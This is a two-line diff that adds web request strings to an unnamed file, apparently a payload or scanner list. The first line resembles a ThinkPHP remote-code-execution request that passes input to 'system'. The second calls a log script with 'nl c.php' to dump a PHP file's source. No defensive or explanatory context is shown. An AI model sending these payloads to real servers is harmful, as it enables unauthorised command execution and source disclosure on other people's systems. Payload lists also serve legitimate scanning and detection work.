@@ -1,0 +1,2 @@
+/s=set&_method=__construct&method=*&filter[]=system
+/tool/log/c.php?strip_slashes=printf&host=nl+c.php
